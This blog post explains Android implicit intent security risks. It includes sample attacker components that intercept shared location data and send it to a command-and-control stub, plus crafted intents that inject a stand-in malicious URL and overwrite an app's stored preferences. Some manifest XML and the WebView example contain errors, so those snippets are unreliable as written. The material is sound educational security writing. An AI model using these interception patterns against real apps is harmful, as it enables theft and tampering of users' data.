---
title: "Security implications of Android implicit intents"
datePublished: Sat Nov 09 2024 23:00:00 GMT+0000 (Coordinated Universal Time)
cuid: cmjvk9rhu000802l5ge5k8efs
slug: security-implications-of-android-implicit-intents
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1737921921956/f4e952cb-ba85-46de-9dcc-d0e8d225612a.jpeg

---


Android [inter-process communication (IPC) is built on a fundam](https://dispatchersdotplayground.hashnode.dev/interprocess-communication-and-the-binder-interface)ental interface called `Binder`. Through this very basic interface, which operates at the Linux kernel level, apps, services, and broadcasts can communicate with each other. To simplify development, Android also provides higher-level APIs to help developers avoid shooting themselves in the foot when building apps.

Android intents are essentially ser[ializable representations t](https://dispatchersdotplayground.hashnode.dev/interprocess-communication-and-the-binder-interface)hat utilise the Binder interface. With them, developers only need to specify a target endpoint for their app or service to communicate with, and the system handles the rest. As the name suggests, intents are a way for your app to launch or communicate with other components on the Android device.

## Vulnerable implicit intents

There are two types of intents: explicit and implicit. I like to think of explicit intents as those that *leave no room for interpretation*. You have a clearly defined starting point, a specific target endpoint, and the data to be exchanged between them. Here’s a simple example:

```kotlin
val intent = Intent(this@MainActivity, LoginActivity::class.java)
startActivity(intent)
```

In this snippet, the code specifies the intent to start `LoginActivity::`[`class.java`](http://class.java), signaling the system to launch it directly. As noted, explicit intents are straightforward, with no ambiguity in their target.

But let’s look at the counterpart of explicit intents. Here is an implicit one:

```kotlin
val locationIntent = Intent(Intent.ACTION_SEND).apply {
    type = "text/plain"
    putExtra(Intent.EXTRA_TEXT, "Here's my location: https://maps.google.com/?q=37.7749,-122.4194")
}
startActivity(Intent.createChooser(locationIntent, "Share location via"))
```

The latter is telling the system to take and handle an intent with no target end specified. Here is where security risks come into play.

When an implicit intent is sent using `startActivity`, Android’s system checks the intent’s `action`, `category`, and `data type` to identify which apps can handle it. Since the intent doesn’t specify a target component, Android looks through all installed apps’ manifest files to find activities with matching intent filters. Any app that has registered an activity with an `ACTION_SEND` intent filter and the correct MIME type (`text/plain` in this case) will be considered eligible.

The system displays a chooser dialog listing all apps that match the intent, allowing the user to select one. Once an app is chosen, Android forwards the intent and its data to that app’s Activity, giving it access to the shared information. But what if the selected app is malicious?

```kotlin
class MaliciousActivity : AppCompatActivity() {
 
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_malicious)
 
        val locationData = intent.getStringExtra(Intent.EXTRA_TEXT)
 
        sendStolenLocationToCommandAndControl(locationData)
        finish()
    }
}
```

Boom—just like that, a malicious actor has intercepted your user’s location data. Of course, this would not work unless the following Activity characteristics is defined in the `AndroidManifest.xml`:

```xml
<activity android:name=".MaliciousActivity", exported="true">
    <intent-filter>
        <action android:name="android.intent.action.SEND" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:mimeType="text/plain" />
    </intent-filter>
</activity>
```

This is just one example of the risks associated with implicit intents. If not handled carefully, they can expose sensitive data to untrusted apps.

A very similar scenario can occur with [Android `Broadcast`s](https://developer.android.com/develop/background-work/background-tasks/broadcasts).

```kotlin
val locationIntent = Intent("com.vulnerable.LOCATION_BROADCAST").apply {
    putExtra("location", "37.7749,-122.4194")
}
sendBroadcast(locationIntent)
```

A malicious broadcast can easily be crafted to intercept the data emitted in the example above:

```kotlin
class MaliciousReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val locationData = intent.getStringExtra("location")
       sendStolenLocationToCommandAndControl(locationData) 
    }
}
```

And this is how its `AndroidManifest.xml` would look:

```xml
<receiver android:name=".MaliciousReceiver", exported="true">
    <intent-filter>
        <action android:name="com.vulnerable.LOCATION_BROADCAST" />
    </intent-filter>
</receiver>
```

Broadcast receivers can be extremely dangerous when it comes to emitting user data from a specific endpoint, as demonstrated in the example above.

On the other hand, if we first identify the vulnerability in the Activity/Broadcast and then craft a malicious intent, this also introduces serious security implications. And this is exactly the other way around.

## Malicious implicit intents

Let’s consider the following Activity:

```xml
<activity android:name=".WebViewActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:scheme="http" />
        <data android:scheme="https" />
    </intent-filter>
</activity>
```

And its implementation:

```kotlin
class WebViewActivity : AppCompatActivity() {
 
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_webview)
 
        val url = intent.getStringExtra("url")
 
        val webView = findViewById<WebView>(R.id.webview)
        webView.webViewClient = WebViewClient()
        webView.loadUrl(url)
    }
}
```

A malicious actor can send this activity an implicit intent with a malicious URL instead of the one the developer intended:

```kotlin
val maliciousIntent = Intent(Intent.ACTION_VIEW).apply {
    data = Uri.parse("http://malicious-site.com")
}
startActivity(maliciousIntent)
```

Since the developer is not sanitizing the input coming from outside, this Activity becomes vulnerable to such an attack.

*Note: There is another way to exploit the above scenario but that has more to do with deep links, something that we would cover in another post.*

The same issue applies if the developer uses a `BroadcastReceiver`:

```kotlin
class FavoriteWebsiteReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val website = intent.getStringExtra("website")
         
        if (website != null) {
            EncryptedSharedPreferences.save("favorite_website", website)
        }
    }
}
```

You might assume that the data is secure because the preferences are encrypted. But think again. Although the preferences may be encrypted, this presents a clear path for overwriting any data stored inside. The broadcast receiver is exposed in the manifest as follows:

```xml
<receiver android:name=".FavoriteWebsiteReceiver", android:exported="true" >
    <intent-filter>
        <action android:name="com.vulnerable.FAVORITE_WEBSITE" />
    </intent-filter>
</receiver>
```

A malicious app can abuse this with only three lines of code:

```kotlin
val maliciousIntent = Intent("com.vulnerable.FAVORITE_WEBSITE")
maliciousIntent.putExtra("website", "http://malicious-site.com")
sendBroadcast(maliciousIntent)
```

With that, the user data is altered, even though the malicious app cannot directly read it.

Android implicit intents can be dangerous, and this vulnerability works both ways: if not crafted correctly, they are susceptible to various security exploits. Interestingly, as we saw in the second part of this article, attackers often create malicious implicit intents to exploit vulnerabilities in Activities, Receivers, Services, and other components.

*Do you already have an app in production but aren’t sure if it has these vulnerabilities? If you’d like, I can review it for you!* [*Schedule a meeting with me today*](https://doodle.com/bp/stavroxhardha/android-pentesting-with-apksherlock) *to secure your app, prevent service disruptions, and keep your users happy.*
